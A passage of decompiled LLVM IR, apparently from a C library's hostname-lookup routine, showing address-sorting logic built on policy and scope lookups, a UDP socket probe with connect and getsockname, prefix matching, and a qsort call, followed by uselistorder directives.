  %v0_d194289 = phi i32 [ %v1_d1bc, %dec_label_pc_d1bc ], [ %v0_d178, %dec_label_pc_d178 ]
  %v1_d188 = inttoptr i32 %v0_d194289 to i32*
  %v2_d188 = load i32, i32* %v1_d188, align 4
  store i32 %v2_d188, i32* @r3, align 4
  %v7_d18c = icmp eq i32 %v2_d188, 2
  store i1 %v7_d18c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d18c, label %dec_label_pc_d194, label %dec_label_pc_d1bc

dec_label_pc_d194:                                ; preds = %dec_label_pc_d188
  %v1_d194 = add i32 %v0_d194289, 8
  store i32 %v1_d194, i32* @r4, align 4
  store i32 %v1_d194, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v1_d1a0 = add i32 %v0_d194289, 20
  %v3_d1a4 = inttoptr i32 %v1_d1a0 to i16*
  %v4_d1a4 = call i32 @memcpy(i16* %v3_d1a4, i32 %v1_d194, i32 4)
  %v0_d1a8 = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_19c74.490 to i32), i32* %r1.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_d1b4 = inttoptr i32 %v0_d1a8 to i16*
  %v4_d1b4 = call i32 @memcpy(i16* %v3_d1b4, i32 ptrtoint (i32* @global_var_19c74.490 to i32), i32 12)
  %v0_d1b8 = load i32, i32* @sl, align 4
  %v1_d1b8 = load i32, i32* @r5, align 4
  %v2_d1b8 = inttoptr i32 %v1_d1b8 to i32*
  store i32 %v0_d1b8, i32* %v2_d1b8, align 4
  %v0_d1bc.pre = load i32, i32* @r5, align 4
  %v0_d1c0.pre.pre = load i32, i32* @r6, align 4
  %v1_d1c0.pre.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d1bc

dec_label_pc_d1bc:                                ; preds = %dec_label_pc_d188, %dec_label_pc_d194
  %v1_d1c0.pre = phi i32 [ %v1_d1c0290, %dec_label_pc_d188 ], [ %v1_d1c0.pre.pre, %dec_label_pc_d194 ]
  %v0_d1c0.pre = phi i32 [ %v1_d1c4291, %dec_label_pc_d188 ], [ %v0_d1c0.pre.pre, %dec_label_pc_d194 ]
  %v0_d1bc = phi i32 [ %v0_d194289, %dec_label_pc_d188 ], [ %v0_d1bc.pre, %dec_label_pc_d194 ]
  %v1_d1bc = add i32 %v0_d1bc, 28
  store i32 %v1_d1bc, i32* @r5, align 4
  %v9_d1c0 = icmp eq i32 %v0_d1c0.pre, %v1_d1c0.pre
  store i1 %v9_d1c0, i1* %cpsr_z.global-to-local, align 1
  %v1_d1c4 = add i32 %v0_d1c0.pre, 1
  store i32 %v1_d1c4, i32* @r6, align 4
  %v5_d1c8 = icmp slt i32 %v0_d1c0.pre, %v1_d1c0.pre
  br i1 %v5_d1c8, label %dec_label_pc_d188, label %dec_label_pc_d1cc

dec_label_pc_d1cc:                                ; preds = %dec_label_pc_d178, %dec_label_pc_d1bc, %dec_label_pc_d0f0
  %v1_d1d0 = phi i32 [ %v1_d11082, %dec_label_pc_d0f0 ], [ %v1_d1c088, %dec_label_pc_d178 ], [ %v1_d1c0.pre, %dec_label_pc_d1bc ]
  %v0_d1cc = load i32, i32* @sb, align 4
  %v7_d1cc = icmp eq i32 %v0_d1cc, 2
  store i1 %v7_d1cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d1cc, label %.thread149, label %bb269

bb269:                                            ; preds = %dec_label_pc_d1cc
  %v2_d1d0 = add i32 %v1_d1d0, -1
  %v4_d1d0 = sub i32 0, %v1_d1d0
  %v5_d1d0 = and i32 %v1_d1d0, %v4_d1d0
  %v6_d1d0 = icmp slt i32 %v5_d1d0, 0
  %v7_d1d0 = icmp slt i32 %v2_d1d0, 0
  %v8_d1d0 = icmp eq i32 %v1_d1d0, 1
  store i1 %v8_d1d0, i1* %cpsr_z.global-to-local, align 1
  %v3_d1d4 = xor i1 %v7_d1d0, %v6_d1d0
  %v4_d1d4 = or i1 %v8_d1d0, %v3_d1d4
  br i1 %v4_d1d4, label %.thread149, label %dec_label_pc_d1f8.preheader

.thread149:                                       ; preds = %dec_label_pc_d1cc, %bb269
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_d42c

dec_label_pc_d1f8.preheader:                      ; preds = %bb269
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_d1f8277 = load i32, i32* @r8, align 4
  %v3_d1f8278 = inttoptr i32 %v1_d1f8277 to i32*
  %v4_d1f8279 = load i32, i32* %v3_d1f8278, align 4
  store i32 %v4_d1f8279, i32* %r3.global-to-local, align 4
  %v7_d1fc280 = icmp eq i32 %v4_d1f8279, 2
  store i32 28, i32* @r2, align 4
  br i1 %v7_d1fc280, label %dec_label_pc_d1ec, label %dec_label_pc_d208

dec_label_pc_d1ec:                                ; preds = %dec_label_pc_d1f8.preheader, %dec_label_pc_d1f4
  %v0_d1ec = phi i32 [ %v1_d1f4, %dec_label_pc_d1f4 ], [ 0, %dec_label_pc_d1f8.preheader ]
  %v1_d200281 = phi i32 [ %v1_d200, %dec_label_pc_d1f4 ], [ 28, %dec_label_pc_d1f8.preheader ]
  %v9_d1ec = icmp eq i32 %v0_d1ec, %v1_d1d0
  br i1 %v9_d1ec, label %dec_label_pc_d42c.loopexit, label %dec_label_pc_d1f4

dec_label_pc_d1f4:                                ; preds = %dec_label_pc_d1ec
  %v1_d1f4 = add i32 %v0_d1ec, 1
  store i32 %v1_d1f4, i32* %r1.global-to-local, align 4
  %v2_d1f8 = add i32 %v1_d1f8277, %v1_d200281
  %v3_d1f8 = inttoptr i32 %v2_d1f8 to i32*
  %v4_d1f8 = load i32, i32* %v3_d1f8, align 4
  store i32 %v4_d1f8, i32* %r3.global-to-local, align 4
  %v7_d1fc = icmp eq i32 %v4_d1f8, 2
  %v1_d200 = add i32 %v1_d200281, 28
  store i32 %v1_d200, i32* @r2, align 4
  br i1 %v7_d1fc, label %dec_label_pc_d1ec, label %dec_label_pc_d208

dec_label_pc_d208:                                ; preds = %dec_label_pc_d1f4, %dec_label_pc_d1f8.preheader
  store i1 false, i1* %cpsr_z.global-to-local, align 1
  %v2_d20c = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_d20c, i32* %r1.global-to-local, align 4
  %v3_d214 = call i32 @__pthread_setcancelstate(i32 1, i32* nonnull %stack_var_-44)
  %v2_d21c = ptrtoint i32* %stack_var_-128 to i32
  %v2_d220 = ptrtoint i32* %stack_var_-148 to i32
  store i32 %v2_d220, i32* %r1.global-to-local, align 4
  %v2_d224 = ptrtoint i32* %stack_var_-120 to i32
  store i32 0, i32* @lr, align 4
  %v2_d230 = ptrtoint i32* %stack_var_-112 to i32
  store i32 %v2_d230, i32* %r3.global-to-local, align 4
  %v0_d234 = load i32, i32* @r8, align 4
  store i32 %v0_d234, i32* @r6, align 4
  %v2_d238 = ptrtoint i32* %stack_var_-140 to i32
  store i32 %v2_d238, i32* @sl, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_d3f821 = load i32, i32* @r7, align 4
  %v3_d3f823 = icmp eq i32 %v1_d3f821, 0
  store i1 %v3_d3f823, i1* %cpsr_z.global-to-local, align 1
  %v5_d3fc30 = icmp sgt i32 %v1_d3f821, 0
  br i1 %v5_d3fc30, label %dec_label_pc_d24c.lr.ph, label %dec_label_pc_d400

dec_label_pc_d24c.lr.ph:                          ; preds = %dec_label_pc_d208
  %v1_d2c8 = bitcast i32* %stack_var_-140 to i8*
  %v2_d32c = ptrtoint i32* %stack_var_-48 to i32
  %v1_d34c = bitcast i32* %stack_var_-112 to i8*
  %v2_d38c = ptrtoint i32* %stack_var_-40 to i32
  %v3_d2a4 = bitcast i32* %stack_var_-140 to i16*
  br label %dec_label_pc_d24c

dec_label_pc_d24c:                                ; preds = %dec_label_pc_d24c.lr.ph, %dec_label_pc_d3bc
  %v0_d250 = phi i32 [ %v0_d234, %dec_label_pc_d24c.lr.ph ], [ %v1_d3f0, %dec_label_pc_d3bc ]
  %stack_var_-3540.031 = phi i32 [ 0, %dec_label_pc_d24c.lr.ph ], [ %v1_d3e0, %dec_label_pc_d3bc ]
  %v1_d250 = add i32 %v0_d250, 4
  %v2_d250 = inttoptr i32 %v1_d250 to i32*
  %v3_d250 = load i32, i32* %v2_d250, align 4
  store i32 %v3_d250, i32* @r4, align 4
  store i32 0, i32* @r1, align 4
  store i32 28, i32* @r2, align 4
  store i32 %v2_d220, i32* @r0, align 4
  %v0_d260 = call i32 @memset()
  %v0_d264 = load i32, i32* @r6, align 4
  %v1_d264 = inttoptr i32 %v0_d264 to i32*
  %v2_d264 = load i32, i32* %v1_d264, align 4
  store i32 %v2_d264, i32* @r3, align 4
  store i32 -1, i32* %r1.global-to-local, align 4
  store i32 10, i32* @lr, align 4
  %v7_d278 = icmp eq i32 %v2_d264, 10
  store i1 %v7_d278, i1* %cpsr_z.global-to-local, align 1
  store i32 10, i32* %stack_var_-148, align 4
  %v1_d284 = add i32 %v0_d264, 8
  store i32 %v1_d284, i32* @r4, align 4
  br i1 %v7_d278, label %.thread11, label %dec_label_pc_d298

.thread11:                                        ; preds = %dec_label_pc_d24c
  br label %dec_label_pc_d2b4

dec_label_pc_d298:                                ; preds = %dec_label_pc_d24c
  store i32 12, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_19c74.490 to i32), i32* %r1.global-to-local, align 4
  %v4_d2a4 = call i32 @memcpy(i16* %v3_d2a4, i32 ptrtoint (i32* @global_var_19c74.490 to i32), i32 12)
  %v0_d2ac = load i32, i32* @r4, align 4
  br label %dec_label_pc_d2b4

dec_label_pc_d2b4:                                ; preds = %.thread11, %dec_label_pc_d298
  %storemerge338 = phi i32 [ %v0_d2ac, %dec_label_pc_d298 ], [ %v1_d284, %.thread11 ]
  %v1_d2b4 = phi i32 [ %v0_d2ac, %dec_label_pc_d298 ], [ %v1_d284, %.thread11 ]
  %v0_d2b4 = phi i32 [ %v2_d21c, %dec_label_pc_d298 ], [ %v2_d238, %.thread11 ]
  %storemerge = phi i32 [ 4, %dec_label_pc_d298 ], [ 16, %.thread11 ]
  store i32 %storemerge338, i32* %r1.global-to-local, align 4
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v3_d2b4 = inttoptr i32 %v0_d2b4 to i16*
  %v4_d2b4 = call i32 @memcpy(i16* %v3_d2b4, i32 %v1_d2b4, i32 %storemerge)
  %v1_d2bc = call i32 @policyof(i32 %v2_d238)
  store i32 %v1_d2bc, i32* @r4, align 4
  %v2_d2c8 = call i32 @scopeof(i8* %v1_d2c8)
  %v0_d2d0 = load i32, i32* @r4, align 4
  %v1_d2d0 = add i32 %v0_d2d0, 18
  %v2_d2d0 = inttoptr i32 %v1_d2d0 to i8*
  %v3_d2d0 = load i8, i8* %v2_d2d0, align 1
  %v4_d2d0 = zext i8 %v3_d2d0 to i32
  store i32 %v4_d2d0, i32* %r3.global-to-local, align 4
  store i32 524290, i32* %r1.global-to-local, align 4
  store i32 17, i32* %r2.global-to-local, align 4
  %v1_d2e4 = add i32 %v0_d2d0, 19
  %v2_d2e4 = inttoptr i32 %v1_d2e4 to i8*
  %v3_d2e4 = load i8, i8* %v2_d2e4, align 1
  %v4_d2e4 = zext i8 %v3_d2e4 to i32
  store i32 %v4_d2e4, i32* @sb, align 4
  %v3_d2e8 = call i32 @socket(i32 10, i32 524290, i32 17)
  store i32 %v3_d2e8, i32* @fp, align 4
  %v1_d2ec = icmp slt i32 %v3_d2e8, 0
  %v2_d2ec = icmp eq i32 %v3_d2e8, 0
  store i1 %v2_d2ec, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_d2ec, label %.thread156, label %dec_label_pc_d2fc

.thread156:                                       ; preds = %dec_label_pc_d2b4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_d3bc

dec_label_pc_d2fc:                                ; preds = %dec_label_pc_d2b4
  store i32 %v2_d220, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  %v3_d308 = call i32 @connect(i32 %v3_d2e8, i32 %v2_d220, i32 28)
  store i32 %v3_d308, i32* @r4, align 4
  %v2_d30c = icmp eq i32 %v3_d308, 0
  store i1 %v2_d30c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d30c, label %dec_label_pc_d31c, label %.thread13

.thread13:                                        ; preds = %dec_label_pc_d2fc
  store i32 0, i32* @r5, align 4
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_d3b4

dec_label_pc_d31c:                                ; preds = %dec_label_pc_d2fc
  store i32 28, i32* %r3.global-to-local, align 4
  %v0_d324 = load i32, i32* @fp, align 4
  store i32 %v2_d224, i32* %r1.global-to-local, align 4
  store i32 %v2_d32c, i32* @r2, align 4
  store i32 28, i32* %stack_var_-48, align 4
  %v5_d334 = call i32 @getsockname(i32 %v0_d324, i32 %v2_d224, i32 %v2_d32c, i32 28, i32 28)
  store i32 %v5_d334, i32* @r5, align 4
  %v2_d338 = icmp eq i32 %v5_d334, 0
  store i1 %v2_d338, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_d338, label %dec_label_pc_d348, label %.thread15

.thread15:                                        ; preds = %dec_label_pc_d31c
  %v1_d33c = load i32, i32* @r4, align 4
  store i32 %v1_d33c, i32* @r5, align 4
  store i32 1073741824, i32* @r4, align 4
  br label %dec_label_pc_d3b4

dec_label_pc_d348:                                ; preds = %dec_label_pc_d31c
  %v2_d34c = call i32 @scopeof(i8* %v1_d34c)
  %v9_d354 = icmp eq i32 %v2_d2c8, %v2_d34c
  store i1 %v9_d354, i1* %cpsr_z.global-to-local, align 1
  %. = select i1 %v9_d354, i32 1610612736, i32 1073741824
  store i32 %., i32* @r4, align 4
  %v1_d364 = call i32 @policyof(i32 %v2_d230)
  %v1_d368 = add i32 %v1_d364, 19
  %v2_d368 = inttoptr i32 %v1_d368 to i8*
  %v3_d368 = load i8, i8* %v2_d368, align 1
  %v4_d368 = zext i8 %v3_d368 to i32
  store i32 %v4_d368, i32* %r3.global-to-local, align 4
  %v0_d36c = load i32, i32* @sb, align 4
  %v9_d36c = icmp eq i32 %v0_d36c, %v4_d368
  store i1 %v9_d36c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_d36c, label %bb273, label %bb274

bb273:                                            ; preds = %dec_label_pc_d348
  %v1_d370 = load i32, i32* @r4, align 4
  %v2_d370 = or i32 %v1_d370, 268435456
  store i32 %v2_d370, i32* @r4, align 4
  br label %bb274

bb274:                                            ; preds = %dec_label_pc_d348, %bb273
  %v0_d374 = load i32, i32* @r5, align 4
  br label %dec_label_pc_d388

dec_label_pc_d37c:                                ; preds = %dec_label_pc_d388
  %v1_d37c = add i32 %v0_d37c, 1
  %v7_d380 = icmp eq i32 %v1_d37c, 128
  store i1 %v7_d380, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_d380, label %dec_label_pc_d3b0, label %dec_label_pc_d388

dec_label_pc_d388:                                ; preds = %dec_label_pc_d37c, %bb274
  %v0_d37c = phi i32 [ %v1_d37c, %dec_label_pc_d37c ], [ %v0_d374, %bb274 ]
  store i32 %v2_d38c, i32* %r1.global-to-local, align 4
  %v4_d390 = udiv i32 %v0_d37c, 8
  %v5_d390 = add i32 %v4_d390, %v2_d38c
  store i32 %v5_d390, i32* %r3.global-to-local, align 4
  %v1_d394 = add i32 %v5_d390, -72
  %v2_d394 = inttoptr i32 %v1_d394 to i8*
  %v3_d394 = load i8, i8* %v2_d394, align 1
  %v4_d394 = zext i8 %v3_d394 to i32
  store i32 %v4_d394, i32* %r2.global-to-local, align 4
  %v1_d398 = add i32 %v5_d390, -100
  %v2_d398 = inttoptr i32 %v1_d398 to i8*
  %v3_d398 = load i8, i8* %v2_d398, align 1
  store i32 128, i32* @lr, align 4
  %v2_d3a0115 = xor i8 %v3_d398, %v3_d394
  %v2_d3a0 = zext i8 %v2_d3a0115 to i32
  store i32 %v2_d3a0, i32* %r3.global-to-local, align 4
  %v1_d3a4 = urem i32 %v0_d37c, 8
  %v7_d3a8 = lshr i32 128, %v1_d3a4
  %v8_d3a8 = and i32 %v2_d3a0, %v7_d3a8
  store i32 %v8_d3a8, i32* %r2.global-to-local, align 4
  %v10_d3a8 = icmp eq i32 %v8_d3a8, 0
  store i1 %v10_d3a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v10_d3a8, label %dec_label_pc_d37c, label %dec_label_pc_d3b0

dec_label_pc_d3b0:                                ; preds = %dec_label_pc_d37c, %dec_label_pc_d388
  %v0_d3b0 = phi i32 [ 128, %dec_label_pc_d37c ], [ %v0_d37c, %dec_label_pc_d388 ]
  store i32 %v0_d3b0, i32* @r5, align 4
  br label %dec_label_pc_d3b4

dec_label_pc_d3b4:                                ; preds = %.thread15, %.thread13, %dec_label_pc_d3b0
  %v0_d3b4 = load i32, i32* @fp, align 4
  %v1_d3b8 = call i32 @close(i32 %v0_d3b4)
  %v1_d3dc.pre = load i32, i32* @r4, align 4
  %v1_d3e4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_d3bc

dec_label_pc_d3bc:                                ; preds = %.thread156, %dec_label_pc_d3b4
  %v1_d3e4 = phi i32 [ 0, %.thread156 ], [ %v1_d3e4.pre, %dec_label_pc_d3b4 ]
  %v1_d3dc = phi i32 [ 0, %.thread156 ], [ %v1_d3dc.pre, %dec_label_pc_d3b4 ]
  store i32 %v4_d2d0, i32* @lr, align 4
  %v1_d3c4 = sub i32 15, %v2_d2c8
  %v3_d3cc = mul nuw nsw i32 %v4_d2d0, 1048576
  %v4_d3d0 = mul i32 %v1_d3c4, 65536
  %v1_d3d4 = sub i32 48, %stack_var_-3540.031
  store i32 %v1_d3d4, i32* %r3.global-to-local, align 4
  %v1_d3e0 = add i32 %stack_var_-3540.031, 1
  store i32 %v1_d3e0, i32* %r1.global-to-local, align 4
  %v4_d3e4 = mul i32 %v1_d3e4, 256
  %v5_d3d0 = or i32 %v4_d3d0, %v1_d3d4
  %v2_d3d8 = or i32 %v5_d3d0, %v3_d3cc
  %v2_d3dc = or i32 %v2_d3d8, %v1_d3dc
  %v5_d3e4 = or i32 %v2_d3dc, %v4_d3e4
  %v1_d3ec = load i32, i32* @r6, align 4
  %v2_d3ec = add i32 %v1_d3ec, 24
  %v3_d3ec = inttoptr i32 %v2_d3ec to i32*
  store i32 %v5_d3e4, i32* %v3_d3ec, align 4
  %v0_d3f0 = load i32, i32* @r6, align 4
  %v1_d3f0 = add i32 %v0_d3f0, 28
  store i32 %v1_d3f0, i32* @r6, align 4
  store i32 %v1_d3e0, i32* %r2.global-to-local, align 4
  %v1_d3f8 = load i32, i32* @r7, align 4
  %v9_d3f8 = icmp eq i32 %v1_d3e0, %v1_d3f8
  store i1 %v9_d3f8, i1* %cpsr_z.global-to-local, align 1
  %v5_d3fc = icmp slt i32 %v1_d3e0, %v1_d3f8
  br i1 %v5_d3fc, label %dec_label_pc_d24c, label %dec_label_pc_d3f4.dec_label_pc_d400_crit_edge

dec_label_pc_d3f4.dec_label_pc_d400_crit_edge:    ; preds = %dec_label_pc_d3bc
  %v0_d400.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_d400

dec_label_pc_d400:                                ; preds = %dec_label_pc_d3f4.dec_label_pc_d400_crit_edge, %dec_label_pc_d208
  %v0_d404 = phi i32 [ %v1_d3f8, %dec_label_pc_d3f4.dec_label_pc_d400_crit_edge ], [ %v1_d3f821, %dec_label_pc_d208 ]
  %v0_d400 = phi i32 [ %v0_d400.pre, %dec_label_pc_d3f4.dec_label_pc_d400_crit_edge ], [ %v0_d234, %dec_label_pc_d208 ]
  store i32 %v0_d404, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  store i32 51564, i32* %r3.global-to-local, align 4
  %v4_d410 = call i32 @qsort(i32 %v0_d400, i32 %v0_d404, i32 28, i32 51564)
  %v3_d414 = load i32, i32* %stack_var_-44, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_d41c = call i32 @__pthread_setcancelstate(i32 %v3_d414, i32* null)
  %v0_d42c.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_d42c

dec_label_pc_d424:                                ; preds = %dec_label_pc_ccc8, %dec_label_pc_cc38
  store i32 1, i32* @r7, align 4
  br label %dec_label_pc_d0f0

dec_label_pc_d42c.loopexit:                       ; preds = %dec_label_pc_d1ec
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_d42c

dec_label_pc_d42c:                                ; preds = %bb268, %.thread149, %dec_label_pc_d0dc, %dec_label_pc_d42c.loopexit, %.thread18, %dec_label_pc_d400, %dec_label_pc_d0e8
  %v0_d42c = phi i32 [ %v1_d1d0, %dec_label_pc_d42c.loopexit ], [ %v0_d42c114, %.thread18 ], [ -11, %bb268 ], [ %v0_d42c.pre, %dec_label_pc_d400 ], [ -2, %dec_label_pc_d0e8 ], [ %v0_d0dc, %dec_label_pc_d0dc ], [ %v1_d1d0, %.thread149 ]
  store i32 %v3_cbb4, i32* @r4, align 4
  store i32 %v6_cbb4, i32* @r5, align 4
  store i32 %v9_cbb4, i32* @r6, align 4
  store i32 %v15_cbb4, i32* @r8, align 4
  store i32 %v21_cbb4, i32* @sl, align 4
  store i32 %v27_cbb4, i32* @lr, align 4
  ret i32 %v0_d42c

; uselistorder directives
  uselistorder i32 %v0_d404, { 1, 0 }
  uselistorder i32 %v1_d3f0, { 1, 0 }
  uselistorder i32 %v1_d3e0, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v0_d37c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_d2c8, { 1, 0 }
  uselistorder i32 %v0_d2ac, { 1, 0 }
  uselistorder i32 %v1_d284, { 1, 0, 2 }
  uselistorder i32 %v1_d3f821, { 2, 0, 1 }
  uselistorder i32 %v2_d238, { 1, 0, 2 }
  uselistorder i32 %v2_d220, { 1, 0, 2, 3 }
  uselistorder i32 %v1_d200, { 1, 0 }
  uselistorder i32 %v1_d1f4, { 1, 0 }
  uselistorder i32 %v0_d1ec, { 1, 0 }
  uselistorder i32 %v1_d1d0, { 0, 1, 2, 3, 5, 6, 4 }
  uselistorder i32 %v1_d1c4, { 1, 0 }
  uselistorder i32 %v1_d1bc, { 1, 0 }
  uselistorder i32 %v0_d1c0.pre, { 0, 2, 1 }
  uselistorder i32 %v1_d1c0.pre, { 0, 2, 3, 1 }
  uselistorder i32 %v0_d194289, { 3, 1, 2, 0 }
  uselistorder i32 %v0_d148.lcssa, { 1, 0 }
  uselistorder i32 %v1_d16c, { 1, 0 }
  uselistorder i32 %v2_d168, { 1, 0 }
  uselistorder i32 %v1_d164, { 1, 0 }
  uselistorder i32 %v0_d168.pre, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v1_d168.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_d148, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_d14c301, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_d120, { 1, 0 }
  uselistorder i32 %v0_d120, { 1, 0 }
  uselistorder i32 %v0_d12c, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v1_d11082, { 0, 6, 7, 1, 2, 3, 4, 5 }
  uselistorder i32 %v0_d0dc, { 0, 1, 3, 2 }
  uselistorder i1 %v7_d0c0, { 1, 0 }
  uselistorder i1 %v7_d0b8, { 1, 0 }
  uselistorder i32 %v1_d080, { 1, 0 }
  uselistorder i32 %v1_d074, { 1, 2, 0 }
  uselistorder i32 %v2_d028, { 1, 0, 2 }
  uselistorder i32 %v0_cff0, { 1, 0 }
  uselistorder i32 %v0_cfa0, { 1, 0 }
  uselistorder i32 %v2_cf60, { 1, 0, 2 }
  uselistorder i8* %v3_cf14, { 1, 0, 2 }
  uselistorder i32 %v2_cf00, { 1, 0 }
  uselistorder i32 %v2_cefc, { 7, 5, 6, 2, 0, 1, 4, 3 }
  uselistorder i32 %v0_cee0, { 1, 0, 2 }
  uselistorder i32 %v1_ce88, { 1, 0 }
  uselistorder i8 %v2_ce80, { 1, 2, 0 }
  uselistorder i8* %v1_ce80, { 2, 0, 1 }
  uselistorder i32 %v1_ce7c, { 2, 3, 0, 1 }
  uselistorder i1 %v7_ce98, { 1, 0 }
  uselistorder i32 %v1_ce7c316, { 1, 0 }
  uselistorder i8* %v1_ce80.lcssa, { 1, 0 }
  uselistorder i32 %v1_ce7c.lcssa, { 2, 0, 1 }
  uselistorder i8* %v1_ce80311, { 1, 0, 2 }
  uselistorder i32 %v1_ce7c310, { 1, 0, 2, 3 }
  uselistorder i32 %v1_ce38, { 0, 1, 3, 2 }
  uselistorder i32 %v1_cdfc, { 2, 1, 0 }
  uselistorder i32 %v4_cdf4, { 0, 2, 1, 3 }
  uselistorder i32 %v0_cdf0, { 1, 0 }
  uselistorder i32 %v7_cdb4, { 2, 0, 1, 4, 3, 5 }
  uselistorder i32 %v0_cd74, { 1, 0 }
  uselistorder i32 %v4_cd38, { 6, 5, 0, 1, 2, 3, 4, 7 }
  uselistorder i32 %v0_cd00, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v4_cc94, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_cc5c, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i1 %v7_ccbc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-140, { 1, 0, 2 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32 %tmp172, { 0, 2, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 4, 5, 6, 7, 8, 9, 10, 24, 25, 40, 3, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 11, 12, 42, 2, 13, 41, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 3, 23, 4, 5, 6, 7, 31, 8, 32, 2, 24, 25, 26, 27, 28, 29, 35, 14, 30, 9, 10, 34, 1, 11, 33, 12, 13, 15, 16, 17, 18, 19, 20, 21, 22, 0 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 7, 8, 9, 0, 10, 11, 31, 32, 6, 44, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 45, 19, 43, 12, 13, 14, 15, 16, 17, 18, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 6, 15, 8, 7, 9, 10, 11, 12, 13, 14, 67, 5, 48, 49, 51, 50, 66, 4, 2, 3, 52, 53, 54, 55, 1, 56, 57, 58, 59, 60, 61, 62, 63, 64, 33, 70, 34, 65, 16, 17, 18, 21, 19, 20, 69, 0, 22, 23, 24, 25, 68, 26, 27, 28, 29, 30, 31, 32, 35, 36, 37, 38, 39, 41, 40, 42, 43, 44, 45, 46, 47 }
  uselistorder i32 (i32, i32, i32)* @connect, { 1, 0, 2 }
  uselistorder i32 (i32)* @policyof, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_19c74.490 to i32), { 1, 2, 0, 3 }
  uselistorder i32 51740, { 1, 0 }
  uselistorder i32 280, { 1, 0 }
  uselistorder i32 (i8*)* @is_valid_hostname, { 1, 0 }
  uselistorder i32 35, { 0, 2, 1 }
  uselistorder i32 1032, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32 (i32, i32, i32)* @name_from_numeric, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_d42c, { 3, 5, 1, 6, 2, 0, 4 }
  uselistorder label %dec_label_pc_d3bc, { 1, 0 }
  uselistorder label %dec_label_pc_d3b4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_d3b0, { 1, 0 }
  uselistorder label %bb274, { 1, 0 }
  uselistorder label %dec_label_pc_d2b4, { 1, 0 }
  uselistorder label %dec_label_pc_d24c, { 1, 0 }
  uselistorder label %dec_label_pc_d1ec, { 1, 0 }
  uselistorder label %.thread149, { 1, 0 }
  uselistorder label %dec_label_pc_d1cc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_d1bc, { 1, 0 }
  uselistorder label %dec_label_pc_d188, { 1, 0 }
  uselistorder label %dec_label_pc_d178, { 0, 2, 1 }
  uselistorder label %dec_label_pc_d164, { 1, 0 }
  uselistorder label %dec_label_pc_d13c, { 1, 0 }
  uselistorder label %dec_label_pc_d118, { 1, 0 }
  uselistorder label %dec_label_pc_d0f0, { 1, 0 }
  uselistorder label %dec_label_pc_d0dc, { 1, 0, 2, 3 }
  uselistorder label %.thread18, { 1, 2, 0 }
  uselistorder label %dec_label_pc_d080, { 1, 0 }
  uselistorder label %dec_label_pc_d024, { 1, 0 }
  uselistorder label %dec_label_pc_cf38, { 1, 0 }
  uselistorder label %dec_label_pc_cf28, { 1, 2, 0 }
  uselistorder label %dec_label_pc_cf08.backedge, { 1, 2, 0 }
  uselistorder label %dec_label_pc_cec8, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_cebc, { 1, 0 }
  uselistorder label %dec_label_pc_ce98, { 1, 0 }
  uselistorder label %dec_label_pc_ce58, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_ce4c, { 1, 0 }
  uselistorder label %dec_label_pc_ce3c.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_ce18, { 1, 0 }
